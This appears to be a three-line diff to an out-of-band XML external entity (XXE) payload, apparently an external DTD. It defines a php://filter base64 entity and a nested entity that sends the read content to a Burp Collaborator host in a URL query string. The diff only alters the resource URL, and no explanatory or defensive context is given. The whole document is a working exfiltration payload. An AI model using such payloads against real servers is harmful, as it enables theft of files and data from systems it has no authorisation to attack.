@@ -1,3 +1,3 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=https://6mtqrej7ash0pmhq6wf3f0dz0q6gu5.burpcollaborator.net">
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=https://a.6mtqrej7ash0pmhq6wf3f0dz0q6gu5.burpcollaborator.net">
 <!ENTITY % read "<!ENTITY % send SYSTEM 'https://6mtqrej7ash0pmhq6wf3f0dz0q6gu5.burpcollaborator.net/?%file;'>">
 
